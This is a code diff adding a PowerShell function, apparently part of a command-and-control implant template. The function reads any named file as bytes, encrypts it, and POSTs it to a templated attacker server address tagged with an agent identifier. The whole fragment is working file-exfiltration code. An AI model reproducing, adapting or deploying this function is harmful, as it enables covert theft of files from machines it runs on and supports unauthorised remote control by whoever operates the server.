@@ -1,0 +1,22 @@
+function dn($filename){
+
+                  try{
+
+            $file_content = Get-Content -LiteralPath $filename -Encoding Byte
+            if ($file_content.Length -eq 0){
+            return $Error[0]}
+            }
+            catch{
+            $output = $Error[0] | Out-String;
+            return $output
+            }
+      $content = enc -key $key -un $file_content -file 1
+
+
+      $postParams = @{f=$filename;d=$content}
+      $output=Invoke-WebRequest -UseBasicParsing -Uri {HTTP}://{ip}:{port}{download}?page=$agent -Method POST -Body $postParams
+      #echo "returned $re.RawContent"
+
+
+      return $output.Content
+      }
